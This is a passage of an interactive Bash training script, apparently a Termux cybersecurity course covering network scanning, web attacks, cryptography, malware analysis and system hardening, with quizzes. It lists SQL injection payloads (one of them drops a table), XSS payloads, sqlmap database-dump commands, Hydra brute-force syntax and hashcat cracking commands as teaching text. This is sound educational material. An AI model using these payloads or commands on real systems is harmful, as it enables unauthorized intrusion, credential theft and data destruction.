  ${CYAN}--script=ftp-anon${WHITE}       - FTP anonymous login
  ${CYAN}--script=smb-vuln-ms17-010${WHITE} - EternalBlue check
  ${CYAN}--script=dns-brute${WHITE}      - DNS brute force
  ${CYAN}--script=http-robots.txt${WHITE} - robots.txt contents
  ${CYAN}--script=vuln${WHITE}           - Run all vuln scripts
  ${CYAN}--script=safe${WHITE}           - Run safe scripts
  ${CYAN}--script=discovery${WHITE}      - Discovery scripts
${NC}"

    press_enter
    
    echo -e "${BOLD}${PURPLE}🔧 PRACTICAL - Install & Use NMAP:${NC}"
    print_separator
    
    echo -ne "${YELLOW}Install NMAP in Termux? (y/n): ${NC}"
    read -r install_nmap
    
    if [[ "$install_nmap" == "y" || "$install_nmap" == "Y" ]]; then
        loading_bar "Installing NMAP "
        pkg install nmap -y 2>/dev/null
        echo ""
        
        echo -e "${GREEN}✅ NMAP installed! Testing with localhost...${NC}"
        echo ""
        echo -e "${CYAN}Command: nmap -sV localhost${NC}"
        nmap -sV localhost 2>/dev/null | head -20
    fi
    
    echo ""
    echo -e "${BOLD}${CYAN}🔍 BANNER GRABBING:${NC}"
    print_separator
    echo -e "${WHITE}
  Banner grabbing gets service information from open ports.

  METHODS:
  ${GREEN}# Using netcat${NC}
  nc -nv target 80
  
  ${GREEN}# Manual HTTP banner${NC}
  echo "HEAD / HTTP/1.0\r\n" | nc target 80

  ${GREEN}# Using curl${NC}
  curl -I http://target.com

  ${GREEN}# Using telnet${NC}
  telnet target 25

  ${GREEN}# Using nmap${NC}
  nmap -sV --version-intensity 9 target
${NC}"

    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 5 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "Which NMAP flag enables version detection?" \
        "-sV" \
        "Service Version..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What does -p- mean in NMAP?" \
        "scan all ports" \
        "How many ports does TCP have total? All of them..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What does a FILTERED port state mean?" \
        "firewall blocking" \
        "Something is blocking the probe..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module5" "completed" && \
        echo -e "${GREEN}🎉 Module 5 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 6: WEB APPLICATION SECURITY
# ============================================

module6_webapp() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 6: WEB APPLICATION SECURITY${NC}"
    print_separator
    
    echo -e "${WHITE}
🌐 THE OWASP TOP 10:
─────────────────────
  OWASP (Open Web Application Security Project) publishes
  the most critical web security risks.

  OWASP TOP 10 (2021):
${NC}"
    echo -e "${RED}  A01 - Broken Access Control        ${WHITE}Most critical!${NC}"
    echo -e "${YELLOW}  A02 - Cryptographic Failures       ${WHITE}Encryption issues${NC}"
    echo -e "${RED}  A03 - Injection                    ${WHITE}SQL, OS, LDAP${NC}"
    echo -e "${YELLOW}  A04 - Insecure Design              ${WHITE}Design flaws${NC}"
    echo -e "${CYAN}  A05 - Security Misconfiguration    ${WHITE}Default configs${NC}"
    echo -e "${YELLOW}  A06 - Vulnerable Components        ${WHITE}Outdated libraries${NC}"
    echo -e "${CYAN}  A07 - Auth & Session Failures      ${WHITE}Weak auth${NC}"
    echo -e "${YELLOW}  A08 - Software Integrity Failures  ${WHITE}Supply chain${NC}"
    echo -e "${GREEN}  A09 - Security Logging Failures    ${WHITE}No monitoring${NC}"
    echo -e "${PURPLE}  A10 - Server-Side Request Forgery  ${WHITE}SSRF attacks${NC}"
    
    press_enter
    
    echo -e "${BOLD}${RED}💉 SQL INJECTION:${NC}"
    print_separator
    echo -e "${WHITE}
  SQL Injection allows attackers to manipulate database queries.

  HOW IT WORKS:
  Vulnerable Code (PHP):
  ${RED}SELECT * FROM users WHERE username='INPUT' AND password='INPUT'${NC}

  Attack:
  Username: ${YELLOW}admin' --${NC}
  Password: ${YELLOW}anything${NC}

  Result:
  ${RED}SELECT * FROM users WHERE username='admin' --' AND password='anything'${NC}
  The -- comments out the password check!

  TYPES OF SQL INJECTION:
  ├── Classic/In-band    - Error-based, Union-based
  ├── Blind              - Boolean-based, Time-based
  └── Out-of-band        - DNS, HTTP channels

  TESTING PAYLOADS (for authorized testing only):
  ${YELLOW}'${NC}                    - Single quote error
  ${YELLOW}' OR '1'='1${NC}         - Always true
  ${YELLOW}' OR '1'='1' --${NC}     - Comment rest
  ${YELLOW}' UNION SELECT null--${NC} - Union attack
  ${YELLOW}'; DROP TABLE users--${NC} - Data destruction
  ${YELLOW}1' AND SLEEP(5)--${NC}   - Time-based blind

  TOOLS:
  • SQLMap - Automated SQL injection testing
${NC}"

    echo -e "${GREEN}SQLMap Usage:${NC}"
    echo -e "${WHITE}  sqlmap -u 'http://target.com/page.php?id=1'${NC}"
    echo -e "${WHITE}  sqlmap -u 'http://target.com/page.php?id=1' --dbs${NC}"
    echo -e "${WHITE}  sqlmap -u 'http://target.com/page.php?id=1' -D dbname --tables${NC}"
    echo -e "${WHITE}  sqlmap -u 'http://target.com/page.php?id=1' --dump${NC}"
    
    press_enter
    
    echo -e "${BOLD}${YELLOW}🔴 CROSS-SITE SCRIPTING (XSS):${NC}"
    print_separator
    echo -e "${WHITE}
  XSS allows attackers to inject malicious scripts into web pages.

  TYPES:
  ├── Reflected XSS  - Script in URL parameter
  ├── Stored XSS     - Script saved in database
  └── DOM-Based XSS  - Client-side script manipulation

  BASIC PAYLOADS (authorized testing only):
  ${YELLOW}<script>alert('XSS')</script>${NC}
  ${YELLOW}<img src=x onerror=alert('XSS')>${NC}
  ${YELLOW}'"><script>alert('XSS')</script>${NC}
  ${YELLOW}<svg onload=alert(1)>${NC}
  ${YELLOW}javascript:alert(1)${NC}

  IMPACT:
  ├── Cookie theft - Session hijacking
  ├── Keylogging   - Capture keystrokes
  ├── Phishing     - Fake login forms
  ├── Defacement   - Change page content
  └── Malware      - Drive-by downloads

  PREVENTION:
  ├── Input validation and sanitization
  ├── Output encoding
  ├── Content Security Policy (CSP)
  └── HTTPOnly and Secure cookie flags
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🔐 AUTHENTICATION ATTACKS:${NC}"
    print_separator
    echo -e "${WHITE}
  BRUTE FORCE ATTACKS:
  Systematically checking all possible passwords.

  TOOLS:
  • Hydra   - Network login cracker
  • Medusa  - Parallel password cracker
  • Burp Suite - Web application proxy

  HYDRA SYNTAX:
${NC}"
    echo -e "${GREEN}  # SSH brute force${NC}"
    echo -e "${WHITE}  hydra -l admin -P wordlist.txt ssh://target${NC}"
    echo ""
    echo -e "${GREEN}  # HTTP POST form${NC}"
    echo -e "${WHITE}  hydra -l admin -P wordlist.txt target http-post-form${NC}"
    echo -e "${WHITE}  '/login:username=^USER^&password=^PASS^:Invalid'${NC}"
    echo ""
    echo -e "${GREEN}  # FTP brute force${NC}"
    echo -e "${WHITE}  hydra -L users.txt -P pass.txt ftp://target${NC}"
    echo ""
    echo -e "${GREEN}  # Multiple targets${NC}"
    echo -e "${WHITE}  hydra -L users.txt -P pass.txt -M targets.txt ssh${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}📋 COMMON WORDLISTS:${NC}"
    print_separator
    echo -e "${WHITE}
  • rockyou.txt       - 14M+ common passwords
  • SecLists          - Comprehensive wordlist collection
  • wordlist.txt      - Custom/curated lists
  • common-passwords  - Top 1000 passwords

  Install SecLists in Termux:
  ${GREEN}pkg install git${NC}
  ${GREEN}git clone https://github.com/danielmiessler/SecLists${NC}
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🔍 DIRECTORY ENUMERATION:${NC}"
    print_separator
    echo -e "${WHITE}
  Finding hidden directories and files on web servers.

  TOOLS:
  • Gobuster  - Directory/DNS bruteforcer
  • Dirb      - Web content scanner
  • Dirsearch - Web path scanner
  • Ffuf      - Fast web fuzzer

  GOBUSTER USAGE:
${NC}"
    echo -e "${GREEN}  # Directory scan${NC}"
    echo -e "${WHITE}  gobuster dir -u http://target.com -w wordlist.txt${NC}"
    echo ""
    echo -e "${GREEN}  # DNS subdomain scan${NC}"
    echo -e "${WHITE}  gobuster dns -d target.com -w subdomains.txt${NC}"
    echo ""
    echo -e "${GREEN}  # Common extensions${NC}"
    echo -e "${WHITE}  gobuster dir -u http://target.com -w wordlist.txt${NC}"
    echo -e "${WHITE}             -x php,html,txt,js,zip${NC}"
    echo ""
    echo -e "${GREEN}  # Install gobuster${NC}"
    echo -e "${WHITE}  pkg install golang${NC}"
    echo -e "${WHITE}  go install github.com/OJ/gobuster/v3@latest${NC}"
    
    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 6 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What does XSS stand for?" \
        "cross-site scripting" \
        "A web vulnerability involving scripts..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which SQL payload comments out the rest of the query?" \
        "--" \
        "SQL comment syntax..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What tool is used for automated SQL injection testing?" \
        "sqlmap" \
        "It automates SQL injection and database takeover..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module6" "completed" && \
        echo -e "${GREEN}🎉 Module 6 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 7: CRYPTOGRAPHY
# ============================================

module7_crypto() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 7: CRYPTOGRAPHY FUNDAMENTALS${NC}"
    print_separator
    
    echo -e "${WHITE}
🔐 WHAT IS CRYPTOGRAPHY?
─────────────────────────
  Cryptography is the practice of securing communication
  by converting readable data (plaintext) into unreadable
  format (ciphertext) using algorithms and keys.

  TYPES OF CRYPTOGRAPHY:
  ┌──────────────────────────────────────────────────┐
  │ SYMMETRIC ENCRYPTION                             │
  │ Same key for encryption and decryption           │
  │ ✅ Fast  ❌ Key distribution problem             │
  │ Examples: AES, DES, 3DES, RC4                   │
  └──────────────────────────────────────────────────┘
  
  ┌──────────────────────────────────────────────────┐
  │ ASYMMETRIC ENCRYPTION (Public Key)               │
  │ Two keys: Public key (encrypt) + Private key     │
  │ ✅ Secure key exchange  ❌ Slower                │
  │ Examples: RSA, ECC, Diffie-Hellman               │
  └──────────────────────────────────────────────────┘
  
  ┌──────────────────────────────────────────────────┐
  │ HASHING (One-way)                                │
  │ No key, not reversible                           │
  │ ✅ Fixed output size  ❌ Not encryption          │
  │ Examples: MD5, SHA-1, SHA-256, bcrypt            │
  └──────────────────────────────────────────────────┘
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}#️⃣ HASHING IN DEPTH:${NC}"
    print_separator
    echo -e "${WHITE}
  Properties of a Good Hash Function:
  ├── Deterministic - Same input = Same output
  ├── One-way - Cannot reverse the hash
  ├── Avalanche Effect - Small change = Different hash
  ├── Collision Resistant - Two inputs shouldn't match
  └── Fixed Length - Output always same size

  COMMON HASH ALGORITHMS:
  ${RED}MD5${WHITE}     - 128-bit, BROKEN (don't use for security)
  ${RED}SHA-1${WHITE}   - 160-bit, DEPRECATED (don't use)
  ${YELLOW}SHA-256${WHITE} - 256-bit, Currently secure
  ${GREEN}SHA-512${WHITE} - 512-bit, Very secure
  ${GREEN}bcrypt${WHITE}  - Adaptive, best for passwords
  ${GREEN}Argon2${WHITE}  - Modern, memory-hard (best)

  PASSWORD STORAGE (WRONG vs RIGHT):
  ❌ Store plaintext: password123
  ❌ Store MD5: 482c811da5d5b4bc6d497ffa98491e38
  ✅ Store bcrypt: \$2b\$12\$EixZaYVK1fsbw1...
${NC}"

    echo -e "${BOLD}${PURPLE}🔧 PRACTICAL - Hashing Demo:${NC}"
    print_separator
    
    echo -e "${WHITE}Let's generate hashes using command line tools:${NC}"
    echo ""
    
    echo -ne "${YELLOW}Enter text to hash: ${NC}"
    read -r hash_input
    
    if [ -n "$hash_input" ]; then
        echo ""
        echo -e "${GREEN}Hash Results for: '${hash_input}'${NC}"
        print_separator
        echo -e "${WHITE}MD5:    ${NC}$(echo -n "$hash_input" | md5sum | cut -d' ' -f1)"
        echo -e "${WHITE}SHA-1:  ${NC}$(echo -n "$hash_input" | sha1sum | cut -d' ' -f1)"
        echo -e "${WHITE}SHA-256:${NC}$(echo -n "$hash_input" | sha256sum | cut -d' ' -f1)"
        echo -e "${WHITE}SHA-512:${NC}$(echo -n "$hash_input" | sha512sum | cut -d' ' -f1)"
    fi
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🔑 ENCRYPTION PRACTICAL:${NC}"
    print_separator
    echo -e "${WHITE}
  Using OpenSSL in Termux:
${NC}"
    echo -e "${GREEN}  # Generate RSA key pair${NC}"
    echo -e "${WHITE}  openssl genrsa -out private.pem 2048${NC}"
    echo -e "${WHITE}  openssl rsa -in private.pem -pubout -out public.pem${NC}"
    echo ""
    echo -e "${GREEN}  # Encrypt file with public key${NC}"
    echo -e "${WHITE}  openssl rsautl -encrypt -pubin -inkey public.pem \\${NC}"
    echo -e "${WHITE}    -in secret.txt -out encrypted.bin${NC}"
    echo ""
    echo -e "${GREEN}  # Decrypt with private key${NC}"
    echo -e "${WHITE}  openssl rsautl -decrypt -inkey private.pem \\${NC}"
    echo -e "${WHITE}    -in encrypted.bin -out decrypted.txt${NC}"
    echo ""
    echo -e "${GREEN}  # AES symmetric encryption${NC}"
    echo -e "${WHITE}  openssl enc -aes-256-cbc -in file.txt -out file.enc${NC}"
    echo ""
    echo -e "${GREEN}  # AES decryption${NC}"
    echo -e "${WHITE}  openssl enc -d -aes-256-cbc -in file.enc -out file.txt${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🔓 PASSWORD CRACKING:${NC}"
    print_separator
    echo -e "${WHITE}
  Password cracking recovers passwords from hashes.

  METHODS:
  ├── Dictionary Attack  - Try words from wordlist
  ├── Brute Force       - Try all combinations
  ├── Rule-based        - Apply mutation rules
  ├── Rainbow Tables    - Precomputed hash tables
  └── Mask Attack       - Pattern-based guessing

  TOOLS:
  • Hashcat  - GPU-accelerated password cracker
  • John the Ripper - Classic password cracker
  • Ophcrack - Rainbow table cracker

  HASHCAT USAGE:
${NC}"
    echo -e "${GREEN}  # Dictionary attack (mode 0)${NC}"
    echo -e "${WHITE}  hashcat -m 0 hashes.txt rockyou.txt${NC}"
    echo ""
    echo -e "${GREEN}  # Hash types:${NC}"
    echo -e "${WHITE}  -m 0     MD5${NC}"
    echo -e "${WHITE}  -m 100   SHA1${NC}"
    echo -e "${WHITE}  -m 1400  SHA256${NC}"
    echo -e "${WHITE}  -m 1800  SHA512${NC}"
    echo -e "${WHITE}  -m 3200  bcrypt${NC}"
    echo -e "${WHITE}  -m 1000  NTLM (Windows)${NC}"
    echo ""
    echo -e "${GREEN}  # Brute force 6-digit PIN${NC}"
    echo -e "${WHITE}  hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d${NC}"
    echo ""
    echo -e "${GREEN}  # John the Ripper${NC}"
    echo -e "${WHITE}  john --wordlist=rockyou.txt hashes.txt${NC}"
    echo -e "${WHITE}  john --show hashes.txt${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🌐 SSL/TLS EXPLAINED:${NC}"
    print_separator
    echo -e "${WHITE}
  SSL/TLS secures communication over the internet.

  TLS HANDSHAKE PROCESS:
  Client → Server: ClientHello (supported cipher suites)
  Server → Client: ServerHello (chosen cipher suite)
  Server → Client: Certificate (public key)
  Client → Server: Pre-master secret (encrypted)
  Both derive session keys from shared secret
  Encrypted communication begins!

  CHECKING SSL CERTIFICATES:
${NC}"
    echo -e "${GREEN}  # Check SSL certificate${NC}"
    echo -e "${WHITE}  openssl s_client -connect google.com:443${NC}"
    echo ""
    echo -e "${GREEN}  # Check certificate details${NC}"
    echo -e "${WHITE}  openssl s_client -connect target.com:443 2>/dev/null \\${NC}"
    echo -e "${WHITE}    | openssl x509 -noout -text${NC}"
    echo ""
    echo -e "${GREEN}  # Check expiry date${NC}"
    echo -e "${WHITE}  openssl s_client -connect target.com:443 2>/dev/null \\${NC}"
    echo -e "${WHITE}    | openssl x509 -noout -dates${NC}"
    
    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 7 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What type of encryption uses the same key to encrypt and decrypt?" \
        "symmetric" \
        "Think of a single key for a lock..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which hashing algorithm is considered broken for security?" \
        "md5" \
        "An older 128-bit algorithm..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What is the best password hashing algorithm mentioned?" \
        "argon2" \
        "Modern, memory-hard algorithm..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module7" "completed" && \
        echo -e "${GREEN}🎉 Module 7 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 8: MALWARE ANALYSIS
# ============================================

module8_malware() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 8: MALWARE ANALYSIS${NC}"
    print_separator
    
    echo -e "${WHITE}
🦠 TYPES OF MALWARE:
─────────────────────
${NC}"
    echo -e "${RED}  VIRUS${WHITE}         - Self-replicating code that attaches to files${NC}"
    echo -e "${RED}  WORM${WHITE}          - Self-replicating, spreads across networks${NC}"
    echo -e "${RED}  TROJAN${WHITE}        - Disguised as legitimate software${NC}"
    echo -e "${YELLOW}  RANSOMWARE${WHITE}    - Encrypts files, demands payment${NC}"
    echo -e "${YELLOW}  SPYWARE${WHITE}      - Monitors and steals user data${NC}"
    echo -e "${YELLOW}  ADWARE${WHITE}       - Displays unwanted advertisements${NC}"
    echo -e "${RED}  ROOTKIT${WHITE}       - Hides malware presence in OS${NC}"
    echo -e "${RED}  KEYLOGGER${WHITE}     - Records keystrokes${NC}"
    echo -e "${RED}  BOTNET${WHITE}        - Network of infected computers${NC}"
    echo -e "${YELLOW}  CRYPTOMINER${WHITE}  - Uses resources for crypto mining${NC}"
    echo -e "${RED}  FILELESS${WHITE}      - Runs in memory, no files written${NC}"
    echo -e "${PURPLE}  APT${WHITE}           - Advanced Persistent Threat${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🔍 STATIC ANALYSIS:${NC}"
    print_separator
    echo -e "${WHITE}
  Analyzing malware WITHOUT executing it.

  TECHNIQUES:
  1. File Type Identification
     ${GREEN}file malware.bin${NC}
     ${GREEN}xxd malware.bin | head${NC}    # Hex dump
     ${GREEN}strings malware.bin${NC}       # Extract readable strings

  2. Hash Verification
     ${GREEN}md5sum malware.bin${NC}
     ${GREEN}sha256sum malware.bin${NC}
     # Compare with VirusTotal database

  3. PE Analysis (Windows executables)
     - Check PE headers
     - Import/Export tables
     - Sections analysis
     - Digital signatures

  4. Code Analysis
     - Disassembly (IDA Pro, Ghidra)
     - Decompilation
     - Control flow analysis

  USEFUL TOOLS:
  • strings   - Extract text from binary
  • file      - Identify file type
  • xxd/hexdump - Hex viewer
  • objdump   - Object file analyzer
  • Ghidra    - NSA reverse engineering tool (free)
  • IDA Pro   - Industry standard (commercial)
  • Radare2   - Open source framework
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}▶️ DYNAMIC ANALYSIS:${NC}"
    print_separator
    echo -e "${WHITE}
  Analyzing malware BY executing it in a safe environment.

  SANDBOX ENVIRONMENT:
  ├── Virtual Machine (VMware, VirtualBox)
  ├── Isolated network (no internet access)
  ├── Snapshots for rollback
  └── Monitoring tools active

  MONITORING WHAT MALWARE DOES:
  ├── File system changes
  ├── Registry modifications (Windows)
  ├── Network connections
  ├── Process creation
  ├── Memory allocations
  └── API calls

  ONLINE SANDBOX SERVICES:
  • VirusTotal    - virustotal.com
  • Any.run       - app.any.run
  • Hybrid Analysis - hybrid-analysis.com
  • Cuckoo Sandbox - Self-hosted

  LINUX MONITORING COMMANDS:
${NC}"
    echo -e "${GREEN}  # Monitor file system changes${NC}"
    echo -e "${WHITE}  inotifywait -m -r /path/to/monitor${NC}"
    echo ""
    echo -e "${GREEN}  # Monitor network connections${NC}"
    echo -e "${WHITE}  ss -tulpn${NC}"
    echo -e "${WHITE}  netstat -anp${NC}"
    echo ""
    echo -e "${GREEN}  # Monitor processes${NC}"
    echo -e "${WHITE}  ps aux --sort=-%cpu${NC}"
    echo -e "${WHITE}  pstree -p${NC}"
    echo ""
    echo -e "${GREEN}  # System call tracing${NC}"
    echo -e "${WHITE}  strace -p PID${NC}"
    echo -e "${WHITE}  ltrace program${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🛡️ ANTI-MALWARE TECHNIQUES:${NC}"
    print_separator
    echo -e "${WHITE}
  MALWARE EVASION TECHNIQUES:
  ├── Obfuscation    - Code made difficult to read
  ├── Packing        - Compressed/encrypted code
  ├── Polymorphism   - Code changes itself
  ├── Metamorphism   - Complete code rewriting
  ├── Anti-debugging - Detect analysis environment
  ├── Anti-VM        - Detect virtual machines
  └── Rootkits       - Hide from OS

  DEFENSE:
  ├── Signature-based detection (AV)
  ├── Heuristic analysis (behavior)
  ├── Machine learning detection
  ├── Sandboxing
  ├── Application whitelisting
  └── User education

  INDICATORS OF COMPROMISE (IoC):
  ├── File hashes
  ├── IP addresses
  ├── Domain names
  ├── URLs
  ├── Email addresses
  └── Registry keys
${NC}"

    press_enter
    
    echo -e "${BOLD}${PURPLE}🔧 PRACTICAL - File Analysis Demo:${NC}"
    print_separator
    
    echo -e "${WHITE}Let's practice static analysis techniques:${NC}"
    echo ""
    
    # Create a sample "suspicious" file for analysis
    echo -e "${GREEN}Creating sample file for analysis...${NC}"
    echo "#!/bin/bash" > /tmp/sample_analyze.sh
    echo "# Sample script for analysis" >> /tmp/sample_analyze.sh
    echo "echo 'Hello World'" >> /tmp/sample_analyze.sh
    echo "echo 'This is a sample file'" >> /tmp/sample_analyze.sh
    
    echo ""
    echo -e "${CYAN}Analyzing: /tmp/sample_analyze.sh${NC}"
    echo ""
    
    echo -e "${YELLOW}1. File Type:${NC}"
    file /tmp/sample_analyze.sh
    
    echo ""
    echo -e "${YELLOW}2. File Hashes:${NC}"
    echo -e "${WHITE}MD5:    $(md5sum /tmp/sample_analyze.sh | cut -d' ' -f1)${NC}"
    echo -e "${WHITE}SHA256: $(sha256sum /tmp/sample_analyze.sh | cut -d' ' -f1)${NC}"
    
    echo ""
    echo -e "${YELLOW}3. Strings Analysis:${NC}"
    strings /tmp/sample_analyze.sh
    
    echo ""
    echo -e "${YELLOW}4. File Permissions:${NC}"
    ls -la /tmp/sample_analyze.sh
    
    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 8 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What type of malware encrypts your files for ransom?" \
        "ransomware" \
        "Demands payment to decrypt your data..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What is analyzing malware without running it called?" \
        "static analysis" \
        "No execution required..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What command extracts readable strings from a binary?" \
        "strings" \
        "It shows text embedded in any file..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module8" "completed" && \
        echo -e "${GREEN}🎉 Module 8 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 9: DEFENSIVE SECURITY
# ============================================

module9_defensive() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 9: DEFENSIVE SECURITY${NC}"
    print_separator
    
    echo -e "${WHITE}
🛡️ DEFENSE IN DEPTH:
─────────────────────
  Multiple layers of security controls.

  LAYERS:
  ┌─────────────────────────────────────┐
  │         PHYSICAL SECURITY           │
  ├─────────────────────────────────────┤
  │         PERIMETER SECURITY          │
  │    (Firewall, IDS/IPS, DMZ)        │
  ├─────────────────────────────────────┤
  │         NETWORK SECURITY            │
  │    (VLANs, ACLs, VPN)             │
  ├─────────────────────────────────────┤
  │         HOST SECURITY               │
  │    (Antivirus, Patching)           │
  ├─────────────────────────────────────┤
  │         APPLICATION SECURITY        │
  │    (WAF, Input validation)         │
  ├─────────────────────────────────────┤
  │         DATA SECURITY               │
  │    (Encryption, DLP, Backups)      │
  └─────────────────────────────────────┘
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🔥 FIREWALLS:${NC}"
    print_separator
    echo -e "${WHITE}
  TYPES OF FIREWALLS:
  ├── Packet Filtering    - Rules based on IP/Port/Protocol
  ├── Stateful Inspection - Tracks connection state
  ├── Application Layer   - Deep packet inspection
  ├── Next-Gen (NGFW)     - AI, behavior analysis
  └── Web Application Firewall (WAF) - HTTP/S protection

  IPTABLES (Linux Firewall):
${NC}"
    echo -e "${GREEN}  # View current rules${NC}"
    echo -e "${WHITE}  iptables -L -n -v${NC}"
    echo ""
    echo -e "${GREEN}  # Block an IP address${NC}"
    echo -e "${WHITE}  iptables -A INPUT -s 192.168.1.100 -j DROP${NC}"
    echo ""
    echo -e "${GREEN}  # Allow SSH only from specific IP${NC}"
    echo -e "${WHITE}  iptables -A INPUT -p tcp --dport 22 -s 192.168.1.1 -j ACCEPT${NC}"
    echo -e "${WHITE}  iptables -A INPUT -p tcp --dport 22 -j DROP${NC}"
    echo ""
    echo -e "${GREEN}  # Block all incoming, allow outgoing${NC}"
    echo -e "${WHITE}  iptables -P INPUT DROP${NC}"
    echo -e "${WHITE}  iptables -P OUTPUT ACCEPT${NC}"
    echo -e "${WHITE}  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT${NC}"
    echo ""
    echo -e "${GREEN}  # Rate limiting (DDoS protection)${NC}"
    echo -e "${WHITE}  iptables -A INPUT -p tcp --dport 80 -m limit \\${NC}"
    echo -e "${WHITE}    --limit 25/minute -j ACCEPT${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}📊 SECURITY MONITORING & LOGGING:${NC}"
    print_separator
    echo -e "${WHITE}
  IMPORTANT LOG FILES (Linux):
  ${GREEN}/var/log/auth.log${WHITE}      - Authentication attempts
  ${GREEN}/var/log/syslog${WHITE}        - System messages
  ${GREEN}/var/log/apache2/access.log${WHITE} - Web server access
  ${GREEN}/var/log/apache2/error.log${WHITE}  - Web server errors
  ${GREEN}/var/log/nginx/access.log${WHITE}   - Nginx access
  ${GREEN}/var/log/fail2ban.log${WHITE}       - Fail2ban actions
  ${GREEN}/var/log/kern.log${WHITE}           - Kernel messages

  MONITORING COMMANDS:
${NC}"
    echo -e "${GREEN}  # Real-time log monitoring${NC}"
    echo -e "${WHITE}  tail -f /var/log/auth.log${NC}"
    echo ""
    echo -e "${GREEN}  # Find failed SSH logins${NC}"
    echo -e "${WHITE}  grep 'Failed password' /var/log/auth.log${NC}"
    echo ""
    echo -e "${GREEN}  # Find successful logins${NC}"
    echo -e "${WHITE}  grep 'Accepted password' /var/log/auth.log${NC}"
    echo ""
    echo -e "${GREEN}  # Count failed attempts by IP${NC}"
    echo -e "${WHITE}  grep 'Failed password' /var/log/auth.log | \\${NC}"
    echo -e "${WHITE}    awk '{print $11}' | sort | uniq -c | sort -rn${NC}"
    echo ""
    echo -e "${GREEN}  # Monitor network connections${NC}"
    echo -e "${WHITE}  watch -n 1 'ss -tulpn'${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🚨 INTRUSION DETECTION SYSTEMS:${NC}"
    print_separator
    echo -e "${WHITE}
  IDS (Intrusion Detection System):
  ├── NIDS - Network-based IDS (monitors network traffic)
  ├── HIDS - Host-based IDS (monitors system)
  └── Hybrid - Both NIDS and HIDS

  IDS vs IPS:
  ├── IDS - Detects and ALERTS
  └── IPS - Detects and BLOCKS

  POPULAR TOOLS:
  • Snort  - Open source NIDS
  • Suricata - High performance IDS/IPS
  • Wazuh  - HIDS platform
  • OSSEC  - HIDS system

  SNORT RULE EXAMPLE:
${NC}"
    echo -e "${WHITE}  ${GREEN}alert${WHITE} tcp any any -> any 80 (${NC}"
    echo -e "${WHITE}    msg:\"Possible SQL Injection\";${NC}"
    echo -e "${WHITE}    content:\"SELECT\";${NC}"
    echo -e "${WHITE}    content:\"FROM\";${NC}"
    echo -e "${WHITE}    sid:1000001;${NC}"
    echo -e "${WHITE}    rev:1;${NC}"
    echo -e "${WHITE}  )${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🔒 HARDENING SYSTEMS:${NC}"
    print_separator
    echo -e "${WHITE}
  LINUX HARDENING CHECKLIST:
${NC}"
    echo -e "${GREEN}  ✅ Keep system updated${NC}"
    echo -e "${WHITE}     apt update && apt upgrade -y${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Disable unnecessary services${NC}"
    echo -e "${WHITE}     systemctl disable servicename${NC}"
    echo -e "${WHITE}     systemctl stop servicename${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Configure SSH securely${NC}"
    echo -e "${WHITE}     PermitRootLogin no${NC}"
    echo -e "${WHITE}     PasswordAuthentication no  # Use keys only${NC}"
    echo -e "${WHITE}     MaxAuthTries 3${NC}"
    echo -e "${WHITE}     Port 2222  # Non-standard port${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Set up Fail2ban${NC}"
    echo -e "${WHITE}     apt install fail2ban${NC}"
    echo -e "${WHITE}     systemctl enable fail2ban${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Enable UFW Firewall${NC}"
    echo -e "${WHITE}     ufw enable${NC}"
